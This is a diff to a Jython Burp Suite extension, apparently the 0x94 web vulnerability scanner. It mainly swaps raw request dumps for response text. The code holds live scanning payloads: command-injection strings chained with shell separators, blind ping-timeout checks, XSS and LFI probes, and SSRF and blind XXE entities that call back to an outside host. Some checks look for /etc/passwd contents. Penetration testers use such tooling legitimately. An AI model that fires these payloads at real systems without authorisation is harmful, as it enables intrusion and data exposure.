@@ -40,14 +40,12 @@ from java.awt.event import ActionListener
 from javax.swing import RowFilter
 from java.awt.event import ItemListener
 from javax.swing.table import TableRowSorter
-
 from java.net import URL
 from thread import start_new_thread
 from urlparse import parse_qs
 from urllib2 import urlopen
 import requests
 import time
-from requests_toolbelt.utils import dump
 import os
 import sys
 from burp import ITextEditor
@@ -171,11 +169,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	    try:
 		urlac = session.get(dizin + xx.strip())
 		response = urlac.text
-		data = dump.dump_all(urlac)
-		rawdata = data.decode('utf-8')
 		if urlac.status_code == 200 or urlac.status_code == 403 or urlac.status_code == 500:
 		    if len(source404)!=len(response):
-			self.ekle("GET", dizin + xx.strip(), xx.strip() + " Brute File - Code="+str(urlac.status_code), dizin + xx.strip(), rawdata)
+			self.ekle("GET", dizin + xx.strip(), xx.strip() + " Brute File - Code="+str(urlac.status_code), dizin + xx.strip(), response)
 	    except:
 		mesaj = "error"
 
@@ -207,11 +203,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	    try:
 		urlac = session.get(dizin + xx)
 		response = urlac.text
-		data = dump.dump_all(urlac)
-		rawdata = data.decode('utf-8')
 		if urlac.status_code == 200:
 		    if yy in response:
-			self.ekle("GET", dizin+xx, xx + " File", dizin+xx, rawdata)
+			self.ekle("GET", dizin+xx, xx + " File", dizin+xx, response)
 	    except:
 		mesaj = "error"
 
@@ -731,19 +725,17 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	    urlac = session.get(url)
 	    response = urlac.text
-	    data = dump.dump_all(urlac)
-	    rawdata = data.decode('utf-8')
 	    for ajx in ajaxtespit:
 		if ajx in response:
-		    self.ekle("GET",url,"Ajax Code", ajx,rawdata)
+		    self.ekle("GET",url,"Ajax Code", ajx,response)
 
 	    for sck in socket:
 		if sck in response:
-		    self.ekle("GET",url,"WebSocket Code", sck,rawdata)
+		    self.ekle("GET",url,"WebSocket Code", sck,response)
 
 	    if "<?xml" not in response and "%PDF" not in response:
 		if "<?php" in response and "?>" in response:
-		    self.ekle("GET",url,"PHP Code","php tag <?php ?>",rawdata)
+		    self.ekle("GET",url,"PHP Code","php tag <?php ?>",response)
 
 
 		# elif "<%" in response and "%>" in response:
@@ -775,8 +767,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 		    urlac = session.get(dizin)
 		    response = urlac.text
-		    data = dump.dump_all(urlac)
-		    rawdata = data.decode('utf-8')
 
 		    if "<title>index of" in response or \
 					   "directory listing for" in response or \
@@ -784,7 +774,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		       "<table summary=\"directory listing" in response or  \
 					   "browsing directory" in response or  \
 		       "[to parent directory]" in response:
-			self.ekle("GET",url,"Index Off", dizin,rawdata)
+			self.ekle("GET",url,"Index Off", dizin,response)
 			# elif "<%" in response and "%>" in response:
 			#    return True,url+" ASP Code",response
 
@@ -827,13 +817,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 		    newurl=url.replace(value[0],remotecommand)
 		    urlac = session.get(newurl)
-
-		    data = dump.dump_all(urlac)
-		    rawdata = data.decode('utf-8')
-		    response = urlac.text
-
 		    if "167734101" in response:
-			self.ekle("GET",url,"Remote Command Execution",newurl, rawdata)
+			self.ekle("GET",url,"Remote Command Execution",newurl, urlac.text)
 
 	    except:
 		mesaj="Error"
@@ -853,10 +838,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    newurl=url.replace(value[0],sep)
 
 		    urlac = session.get(newurl)
-		    data = dump.dump_all(urlac)
-		    rawdata = data.decode('utf-8')
 		    response = urlac.text
-		    self.hatakontrol("GET",url,rawdata,newurl)
+		    self.hatakontrol("GET",url,response,newurl)
 
 	    except:
 		mesaj="Error"
@@ -878,7 +861,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			rx =session.get(newurl)
 			response=rx.text
 			if "0x9411111" in response or "0x94Scanner1111" in response:
-			    self.ekle("GET",lfibul, "Local File Include Base64",newurl, response)
+			    self.ekle("GET",newurl, "Local File Include Base64",newurl, response)
 			    #self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)
 			    
 		    except:
@@ -894,19 +877,16 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	    urlnormal=lfiurl.replace("=", "=0x94buradaydi.txt")
 	    urlac = session.get(urlnormal)
 	    response = urlac.text
-	    data = dump.dump_all(urlac)
-	    rawdata = data.decode('utf-8')
-
 	    if "failed to open stream" in response or "java.io.FileNotFoundException" in response or "java.lang.IllegalArgumentException" in response or "java.net.MalformedURLException" in response or  "open_basedir restriction in effect" in response:
 
-		self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)
+		self.ekle("GET",lfiurl,"Local File Include",urlnormal, response)
 
 
 	    elif "Microsoft VBScript runtime error" in response and "File not found" in response:
 
-		self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)
+		self.ekle("GET",lfiurl,"Local File Include",urlnormal, response)
 
-	    self.hatakontrol("GET",urlnormal,rawdata,urlnormal)
+	    self.hatakontrol("GET",urlnormal,response,urlnormal)
 
 	except:
 	    mesaj="Error"
@@ -929,13 +909,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	    if method == "GET":
 		f = session.get(url + "?" + postgetdict)
-		data = dump.dump_all(f)
-		rawdata = data.decode('utf-8')
+	
 	    else:
 		f = session.post(url, postgetdict)
-		data = dump.dump_all(f)
-		rawdata = data.decode('utf-8')
-	    self.hatakontrol("GET", url, rawdata, url)
+
+	    self.hatakontrol("GET", url, f.text, url)
 
 	except:
 	    mesaj = "fff"
@@ -1041,7 +1019,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
     def getcommandinj(self,url):
 
 	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";",""]
-	cmdhal={}
 	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]
 
 	for sep in seperators:
@@ -1052,24 +1029,20 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 			urlac = session.get(newurl)
 			response = urlac.text
-			cmdhal.clear()
-			data = dump.dump_all(urlac)
-			rawdata = data.decode('utf-8')
-			if "12345669" in response  or "16773409" in response:
-			    self.ekle("GET",url,"Command Injection",newurl, rawdata)
     
-			self.hatakontrol("GET",url,rawdata,url)
+			if "12345669" in response  or "16773409" in response:
+			    self.ekle("GET",url,"Command Injection",newurl, response)
+    
+			self.hatakontrol("GET",url,response,url)
 
 		except:
 		    mesaj="Error"
-		cmdhal.clear()
 		
 		
 		
     def getcommandinj(self,url):
 
 	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";",""]
-	cmdhal={}
 	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]
 
 	for sep in seperators:
@@ -1079,17 +1052,13 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			newurl=url.replace(value[0],sep+safcmd)
 			urlac = session.get(newurl)
 			response = urlac.text
-			cmdhal.clear()
-			data = dump.dump_all(urlac)
-			rawdata = data.decode('utf-8')
 			if "12345669" in response  or "16773409" in response:
-			    self.ekle("GET",url,"Command Injection",newurl, rawdata)
+			    self.ekle("GET",url,"Command Injection",newurl, response)
     
-			self.hatakontrol("GET",url,rawdata,url)
+			self.hatakontrol("GET",url,response,url)
 
 		except:
 		    mesaj="Error"
-		cmdhal.clear()    
 
 
 
@@ -1099,7 +1068,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	
 	
 	anahtar=self.randomString(19)
-	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
+	anahtar_ana="http://www.demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	
 	postgetdict={}
@@ -1116,26 +1085,19 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    y11 = session.get(url+"?"+postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
-			    bakbak=requests.get("http://demowebsitesi.xyz/0x94/0x94.txt").text
+			    bakbak=requests.get("http://www.demowebsitesi.xyz/0x94/0x94.txt").text
 			    if anahtar in bakbak:	
-				self.ekle(method,url,"GET SSRF Injection",str(new_param), rawdata)
+				self.ekle(method,url,"GET SSRF Injection",str(new_param), y11.text)
 				    
-
-
-
 			else:
 			    y11 = session.post(url, postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
-			    bakbak=session.get("http://demowebsitesi.xyz/0x94/0x94.txt").text
+			    bakbak=session.get("http://www.demowebsitesi.xyz/0x94/0x94.txt").text
 			    if anahtar in bakbak:	
-				self.ekle(method,url,"POST SSRF Injection",str(new_param), rawdata)
+				self.ekle(method,url,"POST SSRF Injection",str(new_param), y11.text)
 
-			self.hatakontrol("GET",url,rawdata,url)
+			self.hatakontrol("GET",url,y11.text,url)
 
 		    except:
 			mesaj="Bilinmeyen hata olustu\n"
@@ -1148,9 +1110,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	
 	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
-	cmdhal={}
 	anahtar=self.randomString(19)
-	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
+	anahtar_ana="http://www.demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	for sep in seperators:
 	    try:
@@ -1159,19 +1120,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		
 		    urlac = session.get(newurl)
 		    response = urlac.text
-		    cmdhal.clear()
-		    data = dump.dump_all(urlac)
-		    rawdata = data.decode('utf-8')
-		    bakbak=session.get("http://demowebsitesi.xyz/0x94/0x94.txt").text
+		    bakbak=session.get("http://www.demowebsitesi.xyz/0x94/0x94.txt").text
 		    
 		    if anahtar in bakbak:
-			self.ekle("GET",url,"URL SSRF Injection",newurl, rawdata)
+			self.ekle("GET",url,"URL SSRF Injection",newurl, response)
     
-		    self.hatakontrol("GET",url,rawdata,url)
+		    self.hatakontrol("GET",url,response,url)
 
 	    except:
 		mesaj="Error"
-	    cmdhal.clear()   
 
 
    
@@ -1184,9 +1141,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		urlnormal=urlnormal.replace("=", "="+sqlpay)
 		urlac = session.get(urlnormal)
 		response = urlac.text
-		data = dump.dump_all(urlac)
-		rawdata = data.decode('utf-8')
-		self.hatakontrol("GET",urlnormal,urlnormal+"Payload="+sqlpay,rawdata)
+		self.hatakontrol("GET",urlnormal,urlnormal+"Payload="+sqlpay,response)
 
 	    except:
 		mesaj="Error"
@@ -1308,8 +1263,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		urlnormal=xssurl.replace("=", "="+xssler)
 		urlac = session.get(urlnormal)
 		response = urlac.text
-		data = dump.dump_all(urlac)
-		rawdata = data.decode('utf-8')
 		if "<script>alert(0x000123)" in response or \
 				   "');alert(0x000123)" in response or \
 		   "<sCriPt>alert(0x000123)" in response or \
@@ -1320,10 +1273,10 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    xssmi=self.xsscalisiomu(response)
 		    if xssmi==False:
 			if "failed to open stream" not in response:
-			    self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
+			    self.ekle("GET",xssurl,"XSS",urlnormal, response)
 		    else:
 			if "failed to open stream" not in response:
-			    self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
+			    self.ekle("GET",xssurl,"XSS",urlnormal, response)
 	    except:
 		mesaj="asad"
 
@@ -1376,13 +1329,10 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 	    if method=="GET":
 		f = session.get(url+"?"+postgetdict)
-		data = dump.dump_all(f)
-		rawdata = data.decode('utf-8')
+
 	    else:
 		f = session.post(url, postgetdict)
-		data = dump.dump_all(f)
-		rawdata = data.decode('utf-8')
-	    self.hatakontrol(method,url,rawdata,"postget")
+	    self.hatakontrol(method,url,f.text,"postget")
 	    postgetdict.clear()
 	    postgetdict = params.copy()
 
@@ -1407,14 +1357,10 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 		    if method=="GET":
 			f = session.get(url+"?"+postgetdict)
-			data = dump.dump_all(f)
-			rawdata = data.decode('utf-8')
 		    else:
 			f = session.post(url, postgetdict)
-			data = dump.dump_all(f)
-			rawdata = data.decode('utf-8')
 
-		    self.hatakontrol(method,url,rawdata,"postgettek")
+		    self.hatakontrol(method,url,f.text,"postgettek")
 		    postgetdict.clear()
 		    postgetdict=params.copy()
 
@@ -1520,17 +1466,13 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    y11 = session.get(url+"?"+postgetdict,timeout=40)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 
 			else:
 			    y11 = session.post(url, postgetdict,timeout=40)
 
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
-			self.hatakontrol(method,url,rawdata,url)
+			self.hatakontrol(method,url,y11.text,url)
 
 
 		    except requests.exceptions.Timeout as errt:
@@ -1573,18 +1515,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 				y11 = session.get(url+"?"+postgetdict,timeout=40)
 				postgetdict.clear()
 				postgetdict=params.copy()
-				data = dump.dump_all(y11)
-				rawdata = data.decode('utf-8')
 
 			    else:
 				y11 = session.post(url, postgetdict,timeout=40)
 				postgetdict.clear()
 				postgetdict=params.copy()
-				data = dump.dump_all(y11)
-				rawdata = data.decode('utf-8')
 
 			    if "12345669" in y11.text or "16773409" in y11.text or "Roaming" in y11.text :
-				self.ekle(method,url,"Command injection",str(new_param), rawdata)
+				self.ekle(method,url,"Command injection",str(new_param), y11.text)
 
 			except:
 			    mesaj="ddd"
@@ -1637,8 +1575,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    xsspostresponse = session.get(url+"?"+postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(xsspostresponse)
-			    rawdata = data.decode('utf-8')
 
 			else:
 
@@ -1646,8 +1582,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(xsspostresponse)
-			    rawdata = data.decode('utf-8')
+    
 
 			if "<script>alert(0x000123)" in xsspostresponse.text \
 						   or "');alert(0x000123)" in xsspostresponse.text \
@@ -1660,7 +1595,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 			    xssmi=self.xsscalisiomu(xsspostresponse.text)
 			    if xssmi==False:
-				self.ekle(method,url,"XSS",str(new_param), rawdata)
+				self.ekle(method,url,"XSS",str(new_param), xsspostresponse.text)
 
 
 		    except:
@@ -1693,10 +1628,8 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		urlnormal=gelenurl.replace("=", "="+rlinkler+"?")
 		urlac = session.get(urlnormal)
 		response = urlac.text
-		data = dump.dump_all(urlac)
-		rawdata = data.decode('utf-8')
 		if "<title>Google</title>" in response:
-		    self.ekle("GET",gelenurl,"Open Redirect",urlnormal, rawdata)
+		    self.ekle("GET",gelenurl,"Open Redirect",urlnormal, response)
     
     
 	    except:
@@ -1717,19 +1650,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	try:
 	    if method=="GET":
 		ssisource = session.get(url+"?"+postgetdict)
-		data = dump.dump_all(ssisource)
-		rawdata = data.decode('utf-8')
 	    else:
 		ssisource = session.post(url, postgetdict)
-		data = dump.dump_all(ssisource)
-		rawdata = data.decode('utf-8')
 
 	    if "REMOTE_ADDR" in ssisource.text  and \
 			   "DATE_LOCAL" in ssisource.text and \
 	       "DATE_GMT" in ssisource.text and \
 	       "DOCUMENT_URI" in ssisource.text and \
 			   "LAST_MODIFIED" in ssisource.text:
-		self.ekle(method,url,"SSI Injection",str(new_param), rawdata)
+		self.ekle(method,url,"SSI Injection",str(new_param), ssisource.text)
 	except:
 	    mesaj="fff"
 	    #yaz(mesaj)
@@ -1762,17 +1691,14 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			blindcmdsource = session.get(url+"?"+postgetdict,timeout=40)
 			postgetdict.clear()
 			postgetdict=params.copy()
-			data = dump.dump_all(blindcmdsource)
-			rawdata = data.decode('utf-8')
+
 		    else:
 			blindcmdsource = session.post(url, postgetdict,timeout=40).text
 			postgetdict.clear()
 			postgetdict=params.copy()
-			data = dump.dump_all(blindcmdsource)
-			rawdata = data.decode('utf-8')
 
 		except socket.timeout:
-		    self.ekle(method,url,"Blind Command Injection",str(new_param), "ping -c 50 Timeout \n"+rawdata)
+		    self.ekle(method,url,"Blind Command Injection",str(new_param), "ping -c 50 Timeout \n"+blindcmdsource.text)
 
 
 		except:
@@ -1819,8 +1745,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 			urlac = session.get(urlnormal)
 			response = urlac.text
-			data = dump.dump_all(urlac)
-			rawdata = data.decode('utf-8')
+
 			if urlac.status_code==200:
 			    if "404" not in response:
 				if "<script>alert(0x000123)" in response or \
@@ -1833,9 +1758,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 					"<img Src=0x94 onerror=alert(0x000123)" in response:
 				    xssmi = self.xsscalisiomu(response)
 				    if xssmi == False:
-					self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
+					self.ekle("GET",xssurl,"SEF URL XSS",urlnormal, response)
 				    else:
-					self.ekle("GET", xssurl, "XSS", urlnormal, rawdata)
+					self.ekle("GET", xssurl, "SEF URL XSS", urlnormal, response)
 		    except:
 			mesaj = "Bilinmeyen hata olustu\n"
 
@@ -1876,20 +1801,16 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    y11 = session.get(url+"?"+postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if "167734101" in y11.text:
-				self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)
+				self.ekle(method,url,"Remote Command Injection",str(new_param), y11.text)
 
 
 			else:
 			    y11 = session.post(url, postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if "167734101" in y11.text:
-				self.ekle(method,url,"Remote Command Injection",str(new_param), rawdata)
+				self.ekle(method,url,"Remote Command Injection",str(new_param), y11.text)
 
 		    except:
 			mesaj="eee"
@@ -1920,11 +1841,9 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    y11 = session.get(url+"?"+postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if "README.md" in y11.text:
 				if "README.md%3E%3C%2Fiframe%3E" not in y11.text:
-				    self.ekle(method,url,"Frame Injection",str(new_param), rawdata)
+				    self.ekle(method,url,"Frame Injection",str(new_param), y11.text)
 
 
 
@@ -1934,8 +1853,6 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if "README.md" in y11.text:
 				if "README.md%3E%3C%2Fiframe%3E" not in y11.text:
 				    self.ekle(method,url,"Frame Injection",str(new_param), y11.text)
@@ -1976,19 +1893,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 				y11 = session.get(url+"?"+postgetdict)
 				postgetdict.clear()
 				postgetdict=params.copy()
-				data = dump.dump_all(y11)
-				rawdata = data.decode('utf-8')
 				if "root:x:0:0:root" in y11.text.lower() or str(randint3) in y11.text.lower() or "71e548764806bb158d656120fd28e54f" in y11.text.lower():
-				    self.ekle(method,url,"Code Injection",str(new_param), rawdata)
+				    self.ekle(method,url,"Code Injection",str(new_param), y11.text)
     
 			    else:
 				y11 = session.post(url, postgetdict)
 				postgetdict.clear()
 				postgetdict=params.copy()
-				data = dump.dump_all(y11)
-				rawdata = data.decode('utf-8')
 				if "root:x:0:0:root" in y11.text.lower() or str(randint3) in y11.text.lower() or "71e548764806bb158d656120fd28e54f" in y11.text.lower():
-				    self.ekle(method,url,"Code Injection",str(new_param), rawdata)
+				    self.ekle(method,url,"Code Injection",str(new_param), y11.text)
     
     
     
@@ -2016,23 +1929,19 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			    y11 = session.get(url+"?"+postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if value+"289" in y11.text.lower() or "root:x:0:0:root" in y11.text.lower():
-				self.ekle(method,url,"Template Injection",str(new_param), rawdata)
+				self.ekle(method,url,"Template Injection",str(new_param), y11.text)
 
 			else:
 			    y11 = session.post(url, postgetdict)
 			    postgetdict.clear()
 			    postgetdict=params.copy()
-			    data = dump.dump_all(y11)
-			    rawdata = data.decode('utf-8')
 			    if value+"289" in y11.text.lower() or "root:x:0:0:root" in y11.text.lower():
-				self.ekle(method,url,"Template Injection",str(new_param), rawdata)
+				self.ekle(method,url,"Template Injection",str(new_param), y11.text)
 
 
 			if value+"0x94289" in y11.text.lower():
-			    self.ekle(method,url,"Template Injection",str(new_param), rawdata)
+			    self.ekle(method,url,"Template Injection",str(new_param), y11.text)
 
 
 		    except:
@@ -2142,19 +2051,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		    f = session.get(url + "?" + pay)
 		    response = f.text
 
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 		else:
 
 		    f = session.post(url, pay)
 		    response = f.text
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 	    except:
 		aa="err"
 
 	    if "XMLMarshalException" in response or "UnmarshalException" in response or "SAPException" in response or "not supported, only XML" in response:
-		self.ekle(method, url, "XML Injection Null Value", url + "DATA=" + pay, rawdata)
+		self.ekle(method, url, "XML Injection Null Value", url + "DATA=" + pay, response)
 
 
 
@@ -2166,7 +2071,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	rastgelekaptan = random.randint(0, 9999997)
 	
 	anahtar=self.randomString(19)
-	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
+	anahtar_ana="http://www.demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	
 	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>\n'
@@ -2180,20 +2085,15 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		if method == "GET":
 		    f = session.get(url + "?" + xmlraw)
 		    response = f.text
-
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 		else:
 
 		    f = session.post(url, data=xmlraw,headers=headerim)
 		    response = f.text
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 		self.hatakontrol("POST", url, response, url)
 
-		bakbak=session.get("http://demowebsitesi.xyz/0x94/0x94.txt").text
+		bakbak=session.get("http://www.demowebsitesi.xyz/0x94/0x94.txt").text
 		if anahtar in bakbak:
-		    self.ekle(method, url, "BLIND XXE Injection", url + "DATA" + inject_key+body, rawdata)
+		    self.ekle(method, url, "BLIND XXE Injection", url + "DATA" + inject_key+body, response)
 
 		self.hatakontrol("XXE", url, response, url)
 
@@ -2223,15 +2123,10 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 		if method == "GET":
 		    f = session.get(url + "?" + xmlraw)
 		    response = f.text
-
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 		else:
 
 		    f = session.post(url, data=xmlraw,headers=headerim)
 		    response = f.text
-		    data = dump.dump_all(f)
-		    rawdata = data.decode('utf-8')
 		self.hatakontrol("POST", url, response, url)
 
 		if "XPATH syntax error" in response or "XPathException" in response or \
@@ -2242,7 +2137,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 			"Empty Path Expression" in response or \
 			"4005 Notes error: Query is not understandable" in response or \
 			"root:x:0:0:root" in response or str(rastgelekaptan) in response:
-		    self.ekle(method, url, "POST XXE Injection", url + "DATA" + inject_key+body, rawdata)
+		    self.ekle(method, url, "POST XXE Injection", url + "DATA" + inject_key+body, response)
 
 		self.hatakontrol("XXE", url, response, url)
 
@@ -2377,11 +2272,11 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 
     def table_add(self,method,url,bug,payload,source):
 
-	self._lock.acquire()
+	#self._lock.acquire()
 	row = self._log.size()
 	self._log.add(LogEntry(method, url,bug,payload,source))
 	self.fireTableRowsInserted(row, row)
-	self._lock.release()
+	#self._lock.release()
 
 
 
